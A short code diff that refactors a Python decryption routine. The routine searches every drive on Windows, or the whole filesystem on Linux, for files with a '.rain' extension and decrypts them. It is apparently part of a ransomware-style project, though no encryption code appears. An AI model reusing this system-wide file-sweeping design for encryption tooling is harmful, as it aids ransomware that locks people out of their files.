@@ -73,15 +73,13 @@ class Decrypt:
 		if s=='Windows':
 			for drive in drives:
 				drive = drive+':/'
-				for e in ext:
-					iterator = glob.iglob(drive+'/**/*.rain',recursive=True)
-					for file in iterator:
-						Decrypt.decrypt(file)
-		elif s=='Linux':
-			for e in ext:
-				iterator = glob.iglob('//**/*.rain',recursive=True)
+				iterator = glob.iglob(drive+'/**/*.rain',recursive=True)
 				for file in iterator:
 					Decrypt.decrypt(file)
+		elif s=='Linux':
+			iterator = glob.iglob('//**/*.rain',recursive=True)
+			for file in iterator:
+				Decrypt.decrypt(file)
 
 	def getkey(documents):
 		#Function used to collect the key used for the encryption of files. I think we need a better process.
